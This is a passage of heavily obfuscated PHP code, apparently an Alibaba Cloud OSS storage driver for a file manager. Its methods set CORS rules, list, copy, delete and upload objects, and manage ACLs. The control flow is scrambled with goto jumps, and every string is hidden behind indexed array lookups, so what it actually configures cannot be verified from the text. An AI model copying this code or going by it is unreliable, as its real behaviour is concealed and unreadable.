$f‚ãåòÔ…– => $b¦ƒ˜¯‚›) { if (isset($this->{$f‚ãåòÔ…–})) { $this->{$f‚ãåòÔ…–} = $b¦ƒ˜¯‚›; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($Eµ‚ƒ‚öÃÔ[1252] . LNG($Eµ‚ƒ‚öÃÔ[1253])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto cË‘ß÷âîí; cË‘ß÷âîí: $F”Ù¸‘å¤Ÿ =& $_SERVER[ÒÆ›ÆØÎ¾]; $f¢Ô´ ¯‘É = new OSS\Model\CorsConfig(); $A‡ÙãÏ©±Õ = new OSS\Model\CorsRule(); goto bø†·×®ø‡; Bİ¹Ùáºæ‚: $A‡ÙãÏ©±Õ->addAllowedMethod($F”Ù¸‘å¤Ÿ[1257]); $A‡ÙãÏ©±Õ->addAllowedMethod($F”Ù¸‘å¤Ÿ[1258]); $A‡ÙãÏ©±Õ->addAllowedMethod($F”Ù¸‘å¤Ÿ[158]); goto BùœÃÅßŒø; BùœÃÅßŒø: $A‡ÙãÏ©±Õ->setMaxAgeSeconds(600); $A‡ÙãÏ©±Õ->addExposeHeader($F”Ù¸‘å¤Ÿ[1259]); $A‡ÙãÏ©±Õ->addAllowedHeader($F”Ù¸‘å¤Ÿ[1254]); goto BÏÁ†øŒ«å; bø†·×®ø‡: $A‡ÙãÏ©±Õ->addAllowedOrigin($F”Ù¸‘å¤Ÿ[1254]); $A‡ÙãÏ©±Õ->addAllowedMethod($F”Ù¸‘å¤Ÿ[1255]); $A‡ÙãÏ©±Õ->addAllowedMethod($F”Ù¸‘å¤Ÿ[1256]); goto Bİ¹Ùáºæ‚; BÏÁ†øŒ«å: $f¢Ô´ ¯‘É->addRule($A‡ÙãÏ©±Õ); try { $this->client->putBucketCors($this->bucket, $f¢Ô´ ¯‘É); } catch (OSS\Core\OssException $d˜Ğ«Û‚…») { return !1; } return !0; goto EÂ³“»İÁ×; EÂ³“»İÁ×: } public function getBucketCors() { goto a¾‘©„¹ôç; d¾Ìé¾å Æ: if (!$B¤÷ËâÙ¢‹ || !($AŠ©Š¹¹ = $B¤÷ËâÙ¢‹->getRules())) { return null; } $Då³‚¢ñ®È = $AŠ©Š¹¹[0]->getAllowedOrigins(); $D÷²Œ÷…Œ— = $AŠ©Š¹¹[0]->getAllowedMethods(); goto EÃµÎ»Ûœ; a¾‘©„¹ôç: $fãº šáõ =& $_SERVER[ÒÆ›ÆØÎ¾]; $B¤÷ËâÙ¢‹ = null; try { $B¤÷ËâÙ¢‹ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $A’šøëÃ®) { return null; } goto d¾Ìé¾å Æ; b¦œª©é: return array($fãº šáõ[181] => isset($Då³‚¢ñ®È[0]) ? $Då³‚¢ñ®È[0] : $fãº šáõ[33], $fãº šáõ[185] => $D÷²Œ÷…Œ—, $fãº šáõ[1260] => $f“¹¿„±İ‰, $fãº šáõ[1261] => isset($f•İÈ„ã‘[0]) ? $f•İÈ„ã‘[0] : $fãº šáõ[33], $fãº šáõ[183] => isset($cËë¤¥·º©[0]) ? $cËë¤¥·º©[0] : $fãº šáõ[33]); goto d§¥–³¦¢‡; EÃµÎ»Ûœ: $f“¹¿„±İ‰ = $AŠ©Š¹¹[0]->getMaxAgeSeconds(); $f•İÈ„ã‘ = $AŠ©Š¹¹[0]->getExposeHeaders(); $cËë¤¥·º© = $AŠ©Š¹¹[0]->getAllowedHeaders(); goto b¦œª©é; d§¥–³¦¢‡: } public function isBucketCors() { goto C•ˆ¦ã—; C•ˆ¦ã—: $B‘ù¡…éé =& $_SERVER[ÒÆ›ÆØÎ¾]; $FÏ…¿æº¶¡ = $this->getBucketCors(); if (!$FÏ…¿æº¶¡ || !is_array($FÏ…¿æº¶¡)) { return !1; } goto eƒ±¡ØŠ; cè©µª«Ÿ·: $cÆ„Ç”ÌÓÎ = array($B‘ù¡…éé[186], $B‘ù¡…éé[187], $B‘ù¡…éé[188], $B‘ù¡…éé[189], $B‘ù¡…éé[190]); $eã·à­å¬® = array_diff($cÆ„Ç”ÌÓÎ, $AØ¸•£åéÈ); return empty($eã·à­å¬®); goto EìŠÑİ¨İ©; eƒ±¡ØŠ: if ($FÏ…¿æº¶¡[$B‘ù¡…éé[181]] != $B‘ù¡…éé[182] || $FÏ…¿æº¶¡[$B‘ù¡…éé[183]] != $B‘ù¡…éé[182]) { return !1; } $AØ¸•£åéÈ = array_map($B‘ù¡…éé[184], $FÏ…¿æº¶¡[$B‘ù¡…éé[185]]); if (!is_array($AØ¸•£åéÈ)) { $AØ¸•£åéÈ = array(); } goto cè©µª«Ÿ·; EìŠÑİ¨İ©: } public function mkfile($B¼—ìîÍêİ, $e’øôºË½Ğ = '', $DªÛ’µ¦öÖ = REPEAT_RENAME) { $dåĞ‹‚¢»÷ = $this->setContent($B¼—ìîÍêİ, $e’øôºË½Ğ); if ($dåĞ‹‚¢»÷ !== !1) { return $this->getPathOuter($B¼—ìîÍêİ); } return !1; } public function mkdir($eÉğøÇÍ²‡, $c™ŠƒÛõ = REPEAT_SKIP) { if ($this->_isFolder($eÉğøÇÍ²‡)) { return $this->getPathOuter($eÉğøÇÍ²‡); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($eÉğøÇÍ²‡)); } catch (OSS\Core\OssException $c‚Œ¬¾ìŞâ) { return !1; } return $this->getPathOuter($eÉğøÇÍ²‡); } private function fileList($d†±äÖÉÆï, $b»è¨ù‚­â = '', $A›‹ÍÊáËÑ = 0) { goto eö·ç‚å ; B¾ÉÏ«›‰î: $A–·‰Ïé§ = $D›ÉøƒÒ½˜[33]; $AõÃ·Äæ©ä = 1000; $Cˆö¹Â÷ø÷ = $this->listItemCache === !1 ? !1 : !0; goto CÔ Ûˆªš¥; CÔ Ûˆªš¥: $aæ˜›³ÛŞù = $fÆâ·®Àã„ = array(); while (!0) { check_abort(); $D›µ÷Ç´ô™ = array($D›ÉøƒÒ½˜[1262] => $b»è¨ù‚­â, $D›ÉøƒÒ½˜[1263] => $C¨¡·‡Îù†, $D›ÉøƒÒ½˜[1264] => $AõÃ·Äæ©ä, $D›ÉøƒÒ½˜[1265] => $A–·‰Ïé§); try { $d“¹¢Ï“â = $this->client->listObjects($this->bucket, $D›µ÷Ç´ô™); } catch (OSS\Core\OssException $C¨ò´¢ŒÛˆ) { break; } $A–·‰Ïé§ = $d“¹¢Ï“â->getNextMarker(); $f¯Á¡œ‡Ó© = $d“¹¢Ï“â->getObjectList(); $C“Å·Õç™ = $d“¹¢Ï“â->getPrefixList(); foreach ($f¯Á¡œ‡Ó© as $f÷İÁ¦òÒÔ) { goto c‡­×ñ¨»‡; c‡­×ñ¨»‡: if ($f÷İÁ¦òÒÔ->getKey() == $C¨¡·‡Îù†) { continue; } $D³«µš = $f÷İÁ¦òÒÔ->getKey(); $cÚÁ‰íİÒ» = $f÷İÁ¦òÒÔ->getSize(); goto Bß«Ä§É«ç; Bß«Ä§É«ç: $b¢‹±ÂéÏ¶ = $f÷İÁ¦òÒÔ->getLastModified(); $dÑÒ‹†©ª´ = $A›‹ÍÊáËÑ ? array($D›ÉøƒÒ½˜[28] => $D³«µš, $D›ÉøƒÒ½˜[78] => $cÚÁ‰íİÒ», $D›ÉøƒÒ½˜[197] => strtotime($b¢‹±ÂéÏ¶)) : $D³«µš; $eˆ ­×ƒ‘Í = $cÚÁ‰íİÒ» == 0 && substr($D³«µš, strlen($D³«µš) - 1, 1) == $D›ÉøƒÒ½˜[8] ? !0 : !1; goto e³ğ£©òê³; e³ğ£©òê³: if ($Cˆö¹Â÷ø÷) { $this->cacheMethod($D›ÉøƒÒ½˜[199], $D³«µš, $eˆ ­×ƒ‘Í); $this->cacheMethod($D›ÉøƒÒ½˜[200], $D³«µš, array($D›ÉøƒÒ½˜[78] => $cÚÁ‰íİÒ», $D›ÉøƒÒ½˜[1266] => $cÚÁ‰íİÒ», $D›ÉøƒÒ½˜[84] => strtotime($b¢‹±ÂéÏ¶), $D›ÉøƒÒ½˜[1267] => $b¢‹±ÂéÏ¶)); } if ($eˆ ­×ƒ‘Í) { $aæ˜›³ÛŞù[] = $D³«µš; continue; } $fÆâ·®Àã„[] = $dÑÒ‹†©ª´; goto dÏ±†Ïå¢; dÏ±†Ïå¢: } foreach ($C“Å·Õç™ as $aëĞÖ”Ïö¿) { $aæ˜›³ÛŞù[] = $aëĞÖ”Ïö¿->getPrefix(); if ($Cˆö¹Â÷ø÷) { $this->cacheMethod($D›ÉøƒÒ½˜[199], $D³«µš, !0); } } if ($A–·‰Ïé§ === $D›ÉøƒÒ½˜[33]) { break; } } if ($Cˆö¹Â÷ø÷) { $this->cacheMethod($D›ÉøƒÒ½˜[199], $d†±äÖÉÆï, !0); } goto FÔƒ¬Ó˜›½; FÔƒ¬Ó˜›½: return array($D›ÉøƒÒ½˜[75] => $aæ˜›³ÛŞù, $D›ÉøƒÒ½˜[74] => $fÆâ·®Àã„); goto fÎÈÚ Â³Å; eö·ç‚å : $D›ÉøƒÒ½˜ =& $_SERVER[ÒÆ›ÆØÎ¾]; $d†±äÖÉÆï = trim($d†±äÖÉÆï, $D›ÉøƒÒ½˜[8]); $C¨¡·‡Îù† = empty($d†±äÖÉÆï) && $d†±äÖÉÆï !== $D›ÉøƒÒ½˜[191] ? $D›ÉøƒÒ½˜[33] : $d†±äÖÉÆï . $D›ÉøƒÒ½˜[8]; goto B¾ÉÏ«›‰î; fÎÈÚ Â³Å: } public function copyFile($cÈÅ’Ğ™Š, $B¦¶¯¬é½) { $C»ì“é„‰ô = $this->size($cÈÅ’Ğ™Š); if ($C»ì“é„‰ô < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $cÈÅ’Ğ™Š, $this->bucket, $this->pathEncode($B¦¶¯¬é½)); } catch (OSS\Core\OssException $D‘œÅ™ñƒª) { return !1; } return $this->getPathOuter($B¦¶¯¬é½); } $cÈéÆˆî¦Â = $this->multiCopyObject($cÈÅ’Ğ™Š, $B¦¶¯¬é½, $C»ì“é„‰ô); return $cÈéÆˆî¦Â ? $this->getPathOuter($B¦¶¯¬é½) : !1; } private function multiCopyObject($Bİ­ÈÑÍã, $Bùõ‹¦Öô¤, $e‰‹­­ìÂˆ) { $aÑºçª£º =& $_SERVER[ÒÆ›ÆØÎ¾]; try { goto b–¯êåæ«Õ; b–¯êåæ«Õ: $C•‡·¦¶³Š = array(); if ($AŸ„Ôé¢Û = $this->hashMd5($Bİ­ÈÑÍã)) { $C•‡·¦¶³Š = array(OSS\OssClient::OSS_HEADERS => array($aÑºçª£º[1268] => $AŸ„Ôé¢Û)); } $fùÍ­Ê´ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Bùõ‹¦Öô¤), $C•‡·¦¶³Š); goto f„Ë• ››Ğ; E¹õ¶ÛËé©: $Dó‡ÌË·Äš = 1024 * 1024 * 10; $cßÙãÒò = $this->client->generateMultiuploadParts($e‰‹­­ìÂˆ, $Dó‡ÌË·Äš); foreach ($cßÙãÒò as $D¬îğ‡Û‰Ü => $CÓÕ±ÜÍÛ) { $AÏ»¸Îˆ‰¹ = $eğ²¹Ü§¶ + (int) $CÓÕ±ÜÍÛ[$aÑºçª£º[1269]]; $DŠ¶ø¦Ü£ = (int) $CÓÕ±ÜÍÛ[$aÑºçª£º[335]] + $AÏ»¸Îˆ‰¹ - 1; $fŠŒá‚¬½œ = array($aÑºçª£º[1270] => $AÏ»¸Îˆ‰¹, $aÑºçª£º[1271] => $DŠ¶ø¦Ü£); $c›ŠÈ™Ì—à[] = $this->client->uploadPartCopy($this->bucket, $Bİ­ÈÑÍã, $this->bucket, $this->pathEncode($Bùõ‹¦Öô¤), $B¦àÎŸ—ò, $fùÍ­Ê´, $fŠŒá‚¬½œ); $B¦àÎŸ—ò = $B¦àÎŸ—ò + 1; } goto Cî˜âÇ½ìÚ; f„Ë• ››Ğ: $B¦àÎŸ—ò = 1; $eğ²¹Ü§¶ = 0; $c›ŠÈ™Ì—à = array(); goto E¹õ¶ÛËé©; Cî˜âÇ½ìÚ: $E±¡ ‚Õ = array(); foreach ($c›ŠÈ™Ì—à as $D¬îğ‡Û‰Ü => $aŞ‘’Âùì) { $E±¡ ‚Õ[] = array($aÑºçª£º[1272] => $D¬îğ‡Û‰Ü + 1, $aÑºçª£º[1273] => $aŞ‘’Âùì); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($Bùõ‹¦Öô¤), $fùÍ­Ê´, $E±¡ ‚Õ); goto AğÏ“Ã¬ÓÕ; AğÏ“Ã¬ÓÕ: } catch (OSS\Core\OssException $EĞ¸æ·–°Ù) { return !1; } return !0; } public function moveFile($c‹ó•éù§˜, $CêÍ‘îÖá) { if ($this->copyFile($c‹ó•éù§˜, $CêÍ‘îÖá)) { $this->remove($c‹ó•éù§˜); return $this->getPathOuter($CêÍ‘îÖá); } return !1; } public function delFile($f……ÅêÚµ½) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($f……ÅêÚµ½)); } catch (OSS\Core\OssException $c£ò›³ƒ‘) { return !1; } return !0; } public function delFolder($fÌŞÂ¾ª¢†) { goto d˜†Øè¬İª; fÔøÓæîğ: $fğ¥Ë’ËôŠ = $this->delByBatch($A‘ÎÕÇàËù[$b£‡òå¥Áê[75]]); if (!$fğ¥Ë’ËôŠ) { return !1; } return $this->delFile($F‚ƒì¤…ö¨); goto d®Á·¬é‚; d˜†Øè¬İª: $b£‡òå¥Áê =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$this->exist($fÌŞÂ¾ª¢†)) { return !0; } $this->listItemCache = !1; goto Fç±†‹„ë; Fç±†‹„ë: $A‘ÎÕÇàËù = $this->fileList($fÌŞÂ¾ª¢†); $this->listItemCache = !0; $F‚ƒì¤…ö¨ = trim($fÌŞÂ¾ª¢†, $b£‡òå¥Áê[8]) . $b£‡òå¥Áê[8]; goto BÁºî’î™á; BÁºî’î™á: if (!empty($fÌŞÂ¾ª¢†) && $fÌŞÂ¾ª¢† !== $b£‡òå¥Áê[191] && !in_array($F‚ƒì¤…ö¨, $A‘ÎÕÇàËù[$b£‡òå¥Áê[75]])) { $A‘ÎÕÇàËù[$b£‡òå¥Áê[75]][] = $F‚ƒì¤…ö¨; } $fğ¥Ë’ËôŠ = $this->delByBatch($A‘ÎÕÇàËù[$b£‡òå¥Áê[74]]); if (!$fğ¥Ë’ËôŠ) { return !1; } goto fÔøÓæîğ; d®Á·¬é‚: } private function delByBatch($b†¹Íñ›ñ) { foreach (array_chunk($b†¹Íñ›ñ, 1000) as $D˜ã¾ÊğÏ) { try { $this->client->deleteObjects($this->bucket, $D˜ã¾ÊğÏ); } catch (OSS\Core\OssException $Aò‹‹Ç¢Ó§) { return !1; } } return !0; } public function rename($aœæÖÙ´½Í, $b¢¿¿÷…¥ç) { return $this->renameObject($aœæÖÙ´½Í, $b¢¿¿÷…¥ç); } private function fileInfo($d±±ˆÌ…¬£, $c‘ÀÚ…İ¶ = false, $d¥¤‹¹å·Ã = array()) { goto f±À‰ƒá—‹; f±À‰ƒá—‹: $c Ê¿ô£ë =& $_SERVER[ÒÆ›ÆØÎ¾]; $aİô‰å®ô = array($c Ê¿ô£ë[28] => $this->pathThis($d±±ˆÌ…¬£), $c Ê¿ô£ë[76] => $this->getPathOuter($d±±ˆÌ…¬£), $c Ê¿ô£ë[29] => $c Ê¿ô£ë[193], $c Ê¿ô£ë[78] => isset($d¥¤‹¹å·Ã[$c Ê¿ô£ë[78]]) ? $d¥¤‹¹å·Ã[$c Ê¿ô£ë[78]] : 0, $c Ê¿ô£ë[168] => $this->ext($d±±ˆÌ…¬£)); if ($c‘ÀÚ…İ¶) { return $aİô‰å®ô; } goto FÁÙòŠƒ×‡; B‰†Éò¼ªï: if (isset($d¥¤‹¹å·Ã[$c Ê¿ô£ë[78]])) { $aİô‰å®ô[$c Ê¿ô£ë[78]] = $d¥¤‹¹å·Ã[$c Ê¿ô£ë[78]]; } if (isset($d¥¤‹¹å·Ã[$c Ê¿ô£ë[84]])) { $aİô‰å®ô[$c Ê¿ô£ë[84]] = $d¥¤‹¹å·Ã[$c Ê¿ô£ë[84]]; } if (isset($d¥¤‹¹å·Ã[$c Ê¿ô£ë[197]]) && !trim($aİô‰å®ô[$c Ê¿ô£ë[84]])) { $aİô‰å®ô[$c Ê¿ô£ë[84]] = $d¥¤‹¹å·Ã[$c Ê¿ô£ë[197]]; } goto B„‹»ÆÜ‰Ú; B„‹»ÆÜ‰Ú: return $aİô‰å®ô; goto d‚ğœÜ´…; FÁÙòŠƒ×‡: $aİô‰å®ô[$c Ê¿ô£ë[194]] = $aİô‰å®ô[$c Ê¿ô£ë[84]] = 0; $aİô‰å®ô[$c Ê¿ô£ë[195]] = $aİô‰å®ô[$c Ê¿ô£ë[196]] = !0; if (empty($d¥¤‹¹å·Ã)) { $bŞØ¸»÷”… = $this->objectMeta($d±±ˆÌ…¬£); if (!$bŞØ¸»÷”…) { return $aİô‰å®ô; } $d¥¤‹¹å·Ã = array($c Ê¿ô£ë[84] => strtotime($bŞØ¸»÷”…[$c Ê¿ô£ë[1267]]), $c Ê¿ô£ë[78] => $bŞØ¸»÷”…[$c Ê¿ô£ë[1266]] + 0); } goto B‰†Éò¼ªï; d‚ğœÜ´…: } private function folderInfo($a„ÑìŸÑ, $F›šÍïèŸÎ = false, $fù’æÃ»Ù“ = array()) { goto f£À¶çœŞª; a“†ƒˆàîƒ: $aâ«Ù½ê¹[$cœ¼¥›•Ä[194]] = $aâ«Ù½ê¹[$cœ¼¥›•Ä[84]] = 0; $aâ«Ù½ê¹[$cœ¼¥›•Ä[195]] = $aâ«Ù½ê¹[$cœ¼¥›•Ä[196]] = !0; if (empty($fù’æÃ»Ù“)) { $a„ÑìŸÑ = rtrim($a„ÑìŸÑ, $cœ¼¥›•Ä[8]) . $cœ¼¥›•Ä[8]; $CŞæÂ¿ = $this->objectMeta($a„ÑìŸÑ); if (!$CŞæÂ¿) { return $aâ«Ù½ê¹; } $fù’æÃ»Ù“ = array($cœ¼¥›•Ä[194] => $CŞæÂ¿[$cœ¼¥›•Ä[1274]][$cœ¼¥›•Ä[1275]], $cœ¼¥›•Ä[84] => strtotime($CŞæÂ¿[$cœ¼¥›•Ä[1267]])); } goto DÎœïÆù¬’; DÎœïÆù¬’: if (isset($fù’æÃ»Ù“[$cœ¼¥›•Ä[84]])) { $aâ«Ù½ê¹[$cœ¼¥›•Ä[84]] = $fù’æÃ»Ù“[$cœ¼¥›•Ä[84]]; } if (isset($fù’æÃ»Ù“[$cœ¼¥›•Ä[194]])) { $aâ«Ù½ê¹[$cœ¼¥›•Ä[194]] = $fù’æÃ»Ù“[$cœ¼¥›•Ä[194]]; } return $aâ«Ù½ê¹; goto f¾çÄíÚÑÆ; f£À¶çœŞª: $cœ¼¥›•Ä =& $_SERVER[ÒÆ›ÆØÎ¾]; $aâ«Ù½ê¹ = array($cœ¼¥›•Ä[28] => $this->pathThis($a„ÑìŸÑ), $cœ¼¥›•Ä[76] => $this->getPathOuter($cœ¼¥›•Ä[8] . $a„ÑìŸÑ), $cœ¼¥›•Ä[29] => $cœ¼¥›•Ä[77]); if ($F›šÍïèŸÎ) { return $aâ«Ù½ê¹; } goto a“†ƒˆàîƒ; f¾çÄíÚÑÆ: } public function listPath($bÕŠ¯ˆÁƒİ, $aÜ„¬”¸¹‚ = false) { $dÀóÔ²© Ô =& $_SERVER[ÒÆ›ÆØÎ¾]; $FÏ Ø”÷ = $this->fileList($bÕŠ¯ˆÁƒİ, $dÀóÔ²© Ô[8], !0); foreach ($FÏ Ø”÷[$dÀóÔ²© Ô[75]] as $B–ÁòÈÎ¿ => $BùÚ°¿´ïÂ) { $FÏ Ø”÷[$dÀóÔ²© Ô[75]][$B–ÁòÈÎ¿] = $this->folderInfo($BùÚ°¿´ïÂ, $aÜ„¬”¸¹‚, $BùÚ°¿´ïÂ); } foreach ($FÏ Ø”÷[$dÀóÔ²© Ô[74]] as $B–ÁòÈÎ¿ => $BùÚ°¿´ïÂ) { $FÏ Ø”÷[$dÀóÔ²© Ô[74]][$B–ÁòÈÎ¿] = $this->fileInfo($BùÚ°¿´ïÂ[$dÀóÔ²© Ô[28]], $aÜ„¬”¸¹‚, $BùÚ°¿´ïÂ); } return $FÏ Ø”÷; } public function has($fœÚêÂíÛ, $B”éËƒİ«ğ = false, $A æ‹Ó³·Ú = true) { goto EòíÏ„§í; bæœĞ¾½÷ã: $C±ÒÖ°¾ĞŠ = $Fç…¿Ê•§³[33]; $eë¬•¦­ğÖ = 500; $c½—¾·Š = $cåØÒ‚œÁõ = 0; goto b†õ´êğÒ; b†õ´êğÒ: while (!0) { check_abort(); $dâŒ‹×¼¾ = array($Fç…¿Ê•§³[1262] => $Fç…¿Ê•§³[8], $Fç…¿Ê•§³[1263] => $aÜğíñ×¬Ù, $Fç…¿Ê•§³[1264] => $eë¬•¦­ğÖ, $Fç…¿Ê•§³[1265] => $C±ÒÖ°¾ĞŠ); try { $dêİ‘ó”÷« = $this->client->listObjects($this->bucket, $dâŒ‹×¼¾); } catch (OSS\Core\OssException $Aø§å„Ü¡­) { break; } $C±ÒÖ°¾ĞŠ = $dêİ‘ó”÷«->getNextMarker(); $eƒ©ÓàõÕ‹ = $dêİ‘ó”÷«->getObjectList(); $EÓšÌ¶ÃĞÓ = $dêİ‘ó”÷«->getPrefixList(); if ($B”éËƒİ«ğ) { if (count($eƒ©ÓàõÕ‹) > 1 || count($eƒ©ÓàõÕ‹) == 1 && $eƒ©ÓàõÕ‹[0]->getKey() != $aÜğíñ×¬Ù) { $c½—¾·Š += count($eƒ©ÓàõÕ‹) - 1; } if (!empty($EÓšÌ¶ÃĞÓ)) { $cåØÒ‚œÁõ += count($EÓšÌ¶ÃĞÓ); } if ($C±ÒÖ°¾ĞŠ === $Fç…¿Ê•§³[33]) { break; } continue; } if ($A æ‹Ó³·Ú) { if (!empty($eƒ©ÓàõÕ‹)) { if (count($eƒ©ÓàõÕ‹) > 1 || $eƒ©ÓàõÕ‹[0]->getKey() != $aÜğíñ×¬Ù) { return !0; } } } else { if (!empty($EÓšÌ¶ÃĞÓ)) { return !0; } } if ($C±ÒÖ°¾ĞŠ === $Fç…¿Ê•§³[33]) { break; } } if ($B”éËƒİ«ğ) { return array($Fç…¿Ê•§³[203] => $c½—¾·Š, $Fç…¿Ê•§³[204] => $cåØÒ‚œÁõ); } return !1; goto fÆ¼ƒôÏæÛ; EòíÏ„§í: $Fç…¿Ê•§³ =& $_SERVER[ÒÆ›ÆØÎ¾]; $fœÚêÂíÛ = trim($fœÚêÂíÛ, $Fç…¿Ê•§³[8]); $aÜğíñ×¬Ù = empty($fœÚêÂíÛ) && $fœÚêÂíÛ !== $Fç…¿Ê•§³[191] ? $Fç…¿Ê•§³[33] : $fœÚêÂíÛ . $Fç…¿Ê•§³[8]; goto bæœĞ¾½÷ã; fÆ¼ƒôÏæÛ: } public function listAll($b»ì¹†²˜) { $aîğã”ìƒˆ =& $_SERVER[ÒÆ›ÆØÎ¾]; $a‘°ö¹é· = $this->fileList($b»ì¹†²˜, $aîğã”ìƒˆ[33], !0); $f·¸×¦›¥ˆ = array(); foreach ($a‘°ö¹é·[$aîğã”ìƒˆ[74]] as $aÙ½íí•„ê) { $f·¸×¦›¥ˆ[$aÙ½íí•„ê[$aîğã”ìƒˆ[28]]] = $aÙ½íí•„ê[$aîğã”ìƒˆ[78]]; } foreach ($a‘°ö¹é·[$aîğã”ìƒˆ[75]] as $aÙ½íí•„ê) { if (is_string($aÙ½íí•„ê)) { $f·¸×¦›¥ˆ[$aÙ½íí•„ê] = 0; } } return $this->listAllFiles($b»ì¹†²˜, array_keys($f·¸×¦›¥ˆ), $f·¸×¦›¥ˆ); } public function canRead($Bßˆ†‘Éç³) { $e¿ÇäÎê± =& $_SERVER[ÒÆ›ÆØÎ¾]; $A›ÍÏ‡ï¿… = $this->pathAcl($Bßˆ†‘Éç³); return $A›ÍÏ‡ï¿… == $e¿ÇäÎê±[1276] || $A›ÍÏ‡ï¿… == $e¿ÇäÎê±[519] ? !0 : !1; } public function canWrite($F¿£Ù‰–ªÍ) { $a¦²‚‰Í¥ = $this->pathAcl($F¿£Ù‰–ªÍ); return $a¦²‚‰Í¥ == $_SERVER[ÒÆ›ÆØÎ¾][519] ? !0 : !1; } public function pathAcl($b°ìˆ‡ğ) { goto BÆâ¤Òëì’; eñã«ÀßºŠ: $eÖÑ†èí£³ = $AÅäèßÖä == $E½¾ïô…¯é[34] ? $this->bucketAcl : $AÅäèßÖä; if ($eÖÑ†èí£³ == $E½¾ïô…¯é[1277]) { return $E½¾ïô…¯é[1276]; } if ($eÖÑ†èí£³ == $E½¾ïô…¯é[1278]) { return $E½¾ïô…¯é[519]; } goto fÈ‰Şª†©; fÈ‰Şª†©: return $eÖÑ†èí£³; goto dÄøƒÍ¡Ì¢; BÆâ¤Òëì’: $E½¾ïô…¯é =& $_SERVER[ÒÆ›ÆØÎ¾]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $AÅäèßÖä = $this->client->getObjectAcl($this->bucket, $this->pathEncode($b°ìˆ‡ğ)); } catch (OSS\Core\OssException $BºŞäÖ²Ùì) { return !1; } goto eñã«ÀßºŠ; dÄøƒÍ¡Ì¢: } private function chmodPath($C»øË‡­­ß, $b÷äº°ÑğÉ = '') { $AŞùÀ¶ô‰ò =& $_SERVER[ÒÆ›ÆØÎ¾]; $e‘Š÷”Î = empty($b÷äº°ÑğÉ) ? $AŞùÀ¶ô‰ò[1278] : $b÷äº°ÑğÉ; $Eöæ£ì¯á = array($AŞùÀ¶ô‰ò[34], $AŞùÀ¶ô‰ò[192], $AŞùÀ¶ô‰ò[1277], $AŞùÀ¶ô‰ò[1278]); if (!in_array($e‘Š÷”Î, $Eöæ£ì¯á)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($C»øË‡­­ß), $e‘Š÷”Î); } catch (OSS\Core\OssException $FÓÇÀÅ™…Ä) { return !1; } return !0; } public function getContent($E¥‡„íµ‚) { return $this->fileSubstr($E¥‡„íµ‚, -1); } public function setContent($e’©ŒŞÊ£¥, $E•„Á¡£ = '') { $AİÙìÌšğ =& $_SERVER[ÒÆ›ÆØÎ¾]; try { $c…„’› ¤ = $this->trafficLimit($AİÙìÌšğ[1279]); $bã…äÁõª… = $this->client->putObject($this->bucket, $this->pathEncode($e’©ŒŞÊ£¥), $E•„Á¡£, $c…„’› ¤); } catch (OSS\Core\OssException $fÄ£ÕÄïÇó) { return !1; } $EìŞ’ƒÁÙ = array($AİÙìÌšğ[1268] => trim($bã…äÁõª…[$AİÙìÌšğ[1280]], $AİÙìÌšğ[116]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($e’©ŒŞÊ£¥))); $this->updateObjMeta($e’©ŒŞÊ£¥, $EìŞ’ƒÁÙ); return isset($bã…äÁõª…[$AİÙìÌšğ[1281]][$AİÙìÌšğ[1227]]) ? !0 : !1; } private function updateObjMeta($dÆÊáäÔñƒ, $F•ÆÌÀ·ä“) { $dÆÊáäÔñƒ = $this->pathEncode($dÆÊáäÔñƒ); try { $FÀ·Ù”ƒÈ• = array(OSS\OssClient::OSS_HEADERS => $F•ÆÌÀ·ä“); $this->client->copyObject($this->bucket, $dÆÊáäÔñƒ, $this->bucket, $dÆÊáäÔñƒ, $FÀ·Ù”ƒÈ•); } catch (OSS\Core\OssException $bíÈº·ÒÄÒ) { return !1; } return !0; } public function upload($cíßÀ«, $B²Îó†ç†µ, $díÑ‘õ¡ªİ = false, $f„‚­èÇ = REPEAT_REPLACE) { $d†Œ„Ùƒ„İ =& $_SERVER[ÒÆ›ÆØÎ¾]; $D«†æ„³÷‡ = trim($cíßÀ«, $d†Œ„Ùƒ„İ[8]); $D‰í×éîÄã = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($d†Œ„Ùƒ„İ[1268] => @md5_file($B²Îó†ç†µ)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($cíßÀ«))); $D‰í×éîÄã = $this->trafficLimit($d†Œ„Ùƒ„İ[1279], $D‰í×éîÄã); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($D«†æ„³÷‡), $B²Îó†ç†µ, $D‰í×éîÄã); } catch (OSS\Core\OssException $a©Èµ‡Ò„¶) { return !1; } return $this->getPathOuter($cíßÀ«); } public function getHost() { $AŸÃ˜Íí =& $_SERVER[ÒÆ›ÆØÎ¾]; $eØ«äŒï = explode($AŸÃ˜Íí[177], parent::getHost()); return $eØ«äŒï[0] . $AŸÃ˜Íí[177] . $this->bucket . $AŸÃ˜Íí[95] . $eØ«äŒï[1]; } public function uploadFormData($aƒ‘îßâ‘‘, $eíÕ¼³´« = 3600) { goto b›øåË§œÍ; d‡Ò¦¾Ù¯á: $BïÌø•°ŞÖ = base64_encode(hash_hmac($cñÄäˆçÊ‡[230], $CËÀøËÂ¹‰, $this->secret, !0)); $B†Ù×²»ø  = array($cñÄäˆçÊ‡[1192] => $CËÀøËÂ¹‰, $cñÄäˆçÊ‡[1285] => $this->accessKey, $cñÄäˆçÊ‡[1188] => $cñÄäˆçÊ‡[1180], $cñÄäˆçÊ‡[1286] => $BïÌø•°ŞÖ, $cñÄäˆçÊ‡[175] => $C—è©¶éÀó); $B†Ù×²»ø  = $this->trafficLimit($cñÄäˆçÊ‡[1279], $B†Ù×²»ø ); goto c›£ëßœò¢; c›£ëßœò¢: 